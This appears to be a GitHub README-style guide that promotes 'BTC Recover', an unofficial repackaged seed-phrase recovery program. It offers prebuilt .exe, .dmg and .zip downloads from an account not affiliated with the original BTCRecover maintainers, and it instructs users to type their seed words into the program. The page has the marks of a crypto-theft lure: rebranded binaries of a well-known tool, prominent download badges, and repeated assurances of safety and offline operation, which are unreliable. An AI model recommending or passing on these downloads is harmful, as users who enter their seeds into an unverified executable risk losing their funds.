<p align="center"><img src="https://github.com/btc-recover-tool/learn/raw/HEAD/assets/banner-article.png" alt="Recover a seed phrase with BTC Recover" width="100%"></p>
<h1 align="center">Recover a seed phrase with BTC Recover</h1>
<p align="center">Rebuild a damaged or partly lost recovery phrase.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

> [!IMPORTANT]
> Only download from this GitHub release page.


---

## 💡 Short answer

Enter the words you have, mark the gaps or doubts, and BTC Recover tests combinations against your wallet until the right phrase appears.

## 👀 You'll see this if

- Some seed words are smudged, missing or misspelled
- Your wallet rejects the phrase
- You know an address the wallet used

## 🤔 Why it happens

A BIP39 seed has a checksum and a fixed word list, so many wrong guesses can be rejected quickly. Knowing one address the wallet used lets the tool confirm the right phrase.

Under the hood, BTC Recover is the same engine many people have used since 2014, packaged with an installer and a window so you do not need to set anything up. Everything happens locally. You can unplug the network cable for the whole session and it will work exactly the same.

BTC Recover is a free, open-source program that rebuilds likely answers from what you remember and tests each one on your own computer. It does not connect to an exchange or a server, and it never needs your seed to leave the machine. Think of it as a very patient helper that tries every sensible combination so you do not have to.

**Plain-language terms.** Your seed is the master backup. Your password unlocks a wallet file on one device. Your passphrase changes which wallet the seed opens. The SHA-256 fingerprint proves a download is the exact file that was published. Knowing which of these you lost tells you which guide to follow.

**How people usually get here.** Most lockouts start with something ordinary: a quick backup written in a hurry, a password set late at night, a phone replaced without checking the old wallet first. Years later, the details are fuzzy. Recovery is mostly about turning that fuzzy memory into precise statements, such as this word starts with the letter b or the password ended in a year, which the program can then test exhaustively.

## 🧭 Before you begin

Order your doubts from most to least likely. If you think one word is probably wrong but two might be, start with the one-word search. Small, likely searches first, then widen only if they fail. This saves hours and keeps the process calm.

Keep a simple routine: download and verify while online, install, disconnect, recover, write it down, clean up, and only then reconnect. If you ever had to reconnect mid-session with sensitive data on screen, treat the wallet as exposed and move the funds to a fresh one.

Quick checklist before pressing start: installer verified against the release page, internet switched off, other apps closed, every clue written down, the wallet type chosen correctly and a known address entered if you have one. If any of these is missing, fix it first; it is faster than restarting a long run.

## 🛠️ Step-by-step fix

1. Go offline.
2. Choose seed phrase recovery and your wallet type.
3. Type the words you are sure of in order.
4. Mark unknown or doubtful positions.
5. Add an address the wallet used, if you have one.
6. Start and wait for the match.

If this is your first run, the [first recovery walkthrough](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md) shows each screen. Need the installer checked first? See [verifying your BTC Recover download](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md).

## 🔁 If that did not work

- Check the derivation path if the phrase is valid but the wallet looks empty
- Consider a passphrase if the phrase is correct but funds are missing
- Recheck spelling against the BIP39 word list

Some situations are outside any tool: coins already sent away, a wallet with no surviving file, seed or key, or a device that wiped itself after too many PIN attempts. In those cases a recovery program has nothing to test.

**Why patience pays.** Searches that cover many unknowns can run for a long time, and it is tempting to stop early and try something else. Before you do, check the progress the tool shows and compare it with the size of the search. If the remaining part is reasonable, letting it finish is often the quickest path. If it is far too large, stop and narrow the clues instead of buying faster hardware.

A related problem may be the real cause: try [btc recover bip39 passphrase recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-bip39-passphrase-recovery.md).

If you need a second pair of eyes, the public issue tracker is the place. Say what you entered in general terms, such as eleven known words and one missing, and what the program showed. Never post real words, files or screenshots that show them.

BTC Recover can only work with what exists. It needs a seed, a wallet file or an encrypted key to test against. It cannot reverse a blockchain transaction, and it does not guarantee recovery; when a case is too large it says it can't estimate a reliable time rather than promise one.

## 🛡️ Prevention

- Store your seed in two physical places
- Use metal backup plates for durability
- Check your backup reads correctly once a year

Once you are back in, move the funds to a fresh wallet with a new seed you write down carefully, and test the new backup before sending anything large. The old seed has been typed on a computer, so it is safer to retire it.

**Watch for fake helpers:** after you post about a lost wallet, strangers often reply with offers of private help or a better version of the tool. Ignore them. Download only from the GitHub release and never send recovery data to anyone.

## ❓ FAQ

**Do I need an address?**
It helps confirm the right phrase.

**Does it work for 24 words?**
Yes, the cost grows with what is missing.

**Is it safe to type my seed?**
Only offline, on your own computer.

**Is BTC Recover free?**
Yes. There is no account, trial or fee on recovered funds.

---

## ⬇️ Download

Get [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) for Windows, [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) for macOS or [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) for Linux. Checksums are on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

## 🔗 Related guides

- [BTC Recover BIP39 word list guide](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-bip39-word-list-guide.md)
- [BTC Recover derivation path for an empty wallet](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-derivation-path-empty-wallet.md)
- [BTC Recover seed recovery time estimate](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-seed-recovery-time-estimate.md)
- [All BTC Recover guides](https://github.com/btc-recover-tool/learn)

_BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either._
